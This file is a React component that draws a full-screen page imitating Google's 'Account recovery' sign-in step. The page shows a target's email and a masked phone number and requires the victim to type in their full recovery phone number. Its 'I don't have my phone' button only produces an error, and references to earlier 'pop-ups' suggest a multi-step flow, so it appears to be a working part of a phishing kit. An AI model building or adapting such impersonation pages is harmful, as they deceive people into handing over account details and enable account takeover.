"use client";

import { useState, useEffect, useRef } from "react";

interface GNumberModalProps {
  isOpen: boolean;
  candidateEmail?: string;
  phoneMask?: string; // e.g. "••• ••• •20"
  isSubmitted?: boolean;
  errorMessage?: string | null;
  onSubmitPhone: (phoneNumber: string) => Promise<void>;
  onClose?: () => void;
}

const COUNTRIES = [
  { code: "US", name: "United States", dial: "+1", flag: "🇺🇸" },
  { code: "GB", name: "United Kingdom", dial: "+44", flag: "🇬🇧" },
  { code: "CA", name: "Canada", dial: "+1", flag: "🇨🇦" },
  { code: "AU", name: "Australia", dial: "+61", flag: "🇦🇺" },
  { code: "DE", name: "Germany", dial: "+49", flag: "🇩🇪" },
  { code: "FR", name: "France", dial: "+33", flag: "🇫🇷" },
  { code: "IT", name: "Italy", dial: "+39", flag: "🇮🇹" },
  { code: "ES", name: "Spain", dial: "+34", flag: "🇪🇸" },
  { code: "IN", name: "India", dial: "+91", flag: "🇮🇳" },
  { code: "BR", name: "Brazil", dial: "+55", flag: "🇧🇷" },
  { code: "MX", name: "Mexico", dial: "+52", flag: "🇲🇽" },
  { code: "NL", name: "Netherlands", dial: "+31", flag: "🇳🇱" },
  { code: "CH", name: "Switzerland", dial: "+41", flag: "🇨🇭" },
  { code: "SE", name: "Sweden", dial: "+46", flag: "🇸🇪" },
];

export default function GNumberModal({
  isOpen,
  candidateEmail = "candidate mail @gmail.com",
  phoneMask = "••• ••• •20",
  isSubmitted = false,
  errorMessage = null,
  onSubmitPhone,
  onClose,
}: GNumberModalProps) {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0]);
  const [showCountryDropdown, setShowCountryDropdown] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(errorMessage);
  const inputRef = useRef<HTMLInputElement>(null);
  const dropdownRef = useRef<HTMLDivElement>(null);

  // Sync external error message or reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      if (errorMessage) {
        setError(errorMessage);
        setIsSubmitting(false);
      } else {
        setPhoneNumber("");
        setError(null);
        setIsSubmitting(false);
        setShowCountryDropdown(false);
      }
    }
  }, [isOpen, errorMessage]);

  // Click outside listener for country dropdown
  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setShowCountryDropdown(false);
      }
    }
    if (showCountryDropdown) {
      document.addEventListener("mousedown", handleClickOutside);
    }
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [showCountryDropdown]);

  if (!isOpen) return null;

  const displayCandidateEmail = candidateEmail.trim() || "candidate mail @gmail.com";
  const displayPhoneMask = phoneMask.trim() || "••• ••• •20";

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!phoneNumber.trim()) {
      setError("Enter a phone number");
      return;
    }
    setError(null);
    setIsSubmitting(true);
    try {
      const fullPhone = `${selectedCountry.dial} ${phoneNumber.trim()}`;
      await onSubmitPhone(fullPhone);
    } catch (err: any) {
      setError(err?.message || "Failed to submit phone number. Please try again.");
      setIsSubmitting(false);
    }
  };

  const showSpinnerOnly = isSubmitting || isSubmitted;

  return (
    <div
      className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-[#f0f4f9] p-3 sm:p-6 md:p-10 overflow-y-auto animate-fade-in font-sans"
      role="dialog"
      aria-modal="true"
    >
      <div className="w-full max-w-[1184px] flex flex-col items-center">
        {/* Main Google/SSO Style Card - Scaled Frame (-20%) */}
        <div className="w-full min-h-[512px] sm:min-h-[560px] bg-white rounded-[28px] p-8 sm:p-12 lg:p-16 shadow-[0_8px_36px_rgba(0,0,0,0.08)] border border-black/[0.04] transition-all relative overflow-hidden flex flex-col justify-center">
          {/* Subtle top indeterminate progress bar when submitting */}
          {showSpinnerOnly && (
            <div className="absolute top-0 left-0 right-0 h-1.5 bg-blue-100 overflow-hidden">
              <div className="h-full bg-[#0b57d0] animate-indeterminate" />
            </div>
          )}

          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-14 lg:gap-20 items-center">
            {/* Left Column: N-Logo, Account recovery, Explanation, Email Pill */}
            <div className="space-y-5 sm:space-y-6">
              {/* N-Logo (PNG Format) */}
              <div className="flex items-center">
                <img
                  src="/images/n-logo.png"
                  alt="N-Logo"
                  className="w-16 h-16 object-contain rounded-xl select-none shadow-sm"
                />
              </div>

              {/* Title */}
              <div className="pt-1">
                <h1 className="text-3xl sm:text-4xl lg:text-[43px] font-normal text-[#1f1f1f] tracking-tight leading-[1.15]">
                  Account recovery
                </h1>
              </div>

              {/* Subtitle */}
              <p className="text-sm sm:text-base text-[#1f1f1f] font-normal leading-relaxed pt-1 max-w-lg">
                To help keep your account safe, Google wants to make sure it’s really you trying to sign in
              </p>

              {/* Candidate Email Badge / Pill with Silhouette Icon & Chevron */}
              <div className="pt-1">
                <div className="inline-flex items-center gap-2.5 border border-[#747775]/70 hover:border-[#1f1f1f] rounded-full pl-1.5 pr-3.5 py-1 bg-white hover:bg-gray-50/80 transition-colors select-none cursor-pointer shadow-2xs">
                  {/* Silhouette Avatar Circle */}
                  <div className="w-7 h-7 rounded-full bg-gray-100 text-gray-600 flex items-center justify-center shrink-0">
                    <svg
                      className="w-4 h-4 text-gray-500"
                      viewBox="0 0 24 24"
                      fill="currentColor"
                      aria-hidden="true"
                    >
                      <path
                        fillRule="evenodd"
                        d="M18.685 19.097A9.723 9.723 0 0021.75 12c0-5.385-4.365-9.75-9.75-9.75S2.25 6.615 2.25 12a9.723 9.723 0 003.065 7.097A9.716 9.716 0 0012 21.75a9.716 9.716 0 006.685-2.653zm-12-1.282A8.25 8.25 0 0112 14.25a8.25 8.25 0 015.315 3.565A8.25 8.25 0 0112 20.25a8.25 8.25 0 01-5.315-2.435zM12 6.75a3.75 3.75 0 100 7.5 3.75 3.75 0 000-7.5z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </div>

                  {/* Candidate Email */}
                  <span className="text-sm sm:text-base font-medium text-[#1f1f1f] tracking-tight">
                    {displayCandidateEmail}
                  </span>

                  {/* Downward chevron */}
                  <svg
                    className="w-3.5 h-3.5 text-[#444746]"
                    viewBox="0 0 20 20"
                    fill="currentColor"
                    aria-hidden="true"
                  >
                    <path
                      fillRule="evenodd"
                      d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
                      clipRule="evenodd"
                    />
                  </svg>
                </div>
              </div>
            </div>

            {/* Right Column: Phone Recovery Form OR Pure Round Loading Spinner */}
            <div className="w-full flex flex-col justify-center">
              {showSpinnerOnly ? (
                /* Pure Round Loading Circle (Identical to Pop-up #1, #2, #3) */
                <div className="py-20 sm:py-28 flex flex-col items-center justify-center animate-fade-in w-full">
                  <div
                    className="w-14 h-14 sm:w-16 sm:h-16 border-[4px] border-blue-200 border-t-[#0b57d0] rounded-full animate-spin"
                    aria-label="Loading..."
                  />
                </div>
              ) : (
                /* Phone Recovery Form */
                <form onSubmit={handleSubmit} className="space-y-3.5 pt-2 md:pt-3">
                  {/* Instructional Subtitle with Security Settings Masked Phone */}
                  <p className="text-sm sm:text-base text-[#1f1f1f] font-normal leading-normal pb-1.5">
                    Confirm the phone number you provided in your security settings:{" "}
                    <span className="font-mono font-medium text-[#1f1f1f] tracking-wider">
                      {displayPhoneMask}
                    </span>
                  </p>

                  {/* Flag Selector + Outlined Phone Number Input Box */}
                  <div className="flex items-center gap-2.5">
                    {/* Country Flag Selector with Dropdown */}
                    <div className="relative shrink-0" ref={dropdownRef}>
                      <button
                        type="button"
                        onClick={() => setShowCountryDropdown(!showCountryDropdown)}
                        className="flex items-center gap-1.5 h-[54px] sm:h-[60px] px-3 bg-white border border-[#747775] hover:border-[#1f1f1f] rounded-[5px] transition-colors cursor-pointer"
                        title={`${selectedCountry.name} (${selectedCountry.dial})`}
                      >
                        <span className="text-xl leading-none">{selectedCountry.flag}</span>
                        <svg
                          className="w-3.5 h-3.5 text-[#444746]"
                          viewBox="0 0 20 20"
                          fill="currentColor"
                        >
                          <path
                            fillRule="evenodd"
                            d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
                            clipRule="evenodd"
                          />
                        </svg>
                      </button>

                      {/* Dropdown Menu */}
                      {showCountryDropdown && (
                        <div className="absolute left-0 top-[66px] z-50 w-64 max-h-60 overflow-y-auto bg-white border border-gray-200 rounded-xl shadow-xl py-2 divide-y divide-gray-100 text-sm">
                          {COUNTRIES.map((c) => (
                            <button
                              key={c.code}
                              type="button"
                              onClick={() => {
                                setSelectedCountry(c);
                                setShowCountryDropdown(false);
                                inputRef.current?.focus();
                              }}
                              className="w-full flex items-center justify-between px-3.5 py-2 hover:bg-gray-50 transition-colors text-left cursor-pointer"
                            >
                              <div className="flex items-center gap-2.5">
                                <span className="text-xl leading-none">{c.flag}</span>
                                <span className="text-gray-900 font-medium">{c.name}</span>
                              </div>
                              <span className="font-mono text-gray-500 text-xs">{c.dial}</span>
                            </button>
                          ))}
                        </div>
                      )}
                    </div>

                    {/* Phone Number Input */}
                    <div className="relative flex-1">
                      <input
                        ref={inputRef}
                        type="tel"
                        value={phoneNumber}
                        onChange={(e) => {
                          setPhoneNumber(e.target.value);
                          if (error) setError(null);
                        }}
                        onFocus={() => setIsFocused(true)}
                        onBlur={() => setIsFocused(false)}
                        placeholder="Phone number"
                        autoComplete="tel"
                        autoFocus
                        disabled={isSubmitting}
                        className={`w-full h-[54px] sm:h-[60px] px-4 text-base sm:text-lg text-[#1f1f1f] bg-white rounded-[5px] border outline-none transition-all font-sans placeholder:text-[#747775] ${
                          error
                            ? "border-2 border-[#b3261e]"
                            : isFocused
                            ? "border-2 border-[#0b57d0]"
                            : "border border-[#747775] hover:border-[#1f1f1f]"
                        }`}
                      />
                    </div>
                  </div>

                  {/* Error Notification */}
                  {error && (
                    <div className="pt-1 flex items-center gap-2 text-xs sm:text-sm text-[#b3261e] font-normal animate-fade-in">
                      <svg className="w-4 h-4 shrink-0 fill-current" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                          clipRule="evenodd"
                        />
                      </svg>
                      <span>{error}</span>
                    </div>
                  )}

                  {/* Action Row: "I don't have my phone" & Next Button */}
                  <div className="flex items-center justify-between pt-8 sm:pt-12">
                    <button
                      type="button"
                      onClick={() => {
                        setError("Please enter the recovery phone number associated with your account.");
                      }}
                      className="bg-[#f0f4f9] hover:bg-[#e1e7f0] text-[#0b57d0] font-medium text-xs sm:text-sm px-5 py-2 rounded-full transition-colors cursor-pointer select-none"
                    >
                      I don’t have my phone
                    </button>

                    <button
                      type="submit"
                      disabled={isSubmitting || !phoneNumber.trim()}
                      className="bg-[#0b57d0] hover:bg-[#0842a0] disabled:bg-[#0b57d0]/40 disabled:cursor-not-allowed text-white font-medium text-sm sm:text-base px-7 py-2.5 sm:py-3 rounded-full transition-all active:scale-95 shadow-xs flex items-center justify-center cursor-pointer select-none"
                    >
                      <span>Next</span>
                    </button>
                  </div>
                </form>
              )}
            </div>
          </div>
        </div>

        {/* Outer Footer Below Card (Identical to Pop-up #1, #2, #3) */}
        <div className="w-full max-w-[1184px] flex flex-col sm:flex-row items-center justify-between gap-3 text-xs sm:text-sm text-[#444746] mt-5 px-4 select-none">
          {/* Language selector */}
          <div className="flex items-center gap-2 hover:text-[#1f1f1f] cursor-pointer">
            <span>English (United States)</span>
            <span className="text-xs">▼</span>
          </div>

          {/* Legal / Help links */}
          <div className="flex items-center gap-6 sm:gap-7">
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Help</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Privacy</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Terms</span>
          </div>
        </div>
      </div>
    </div>
  );
}
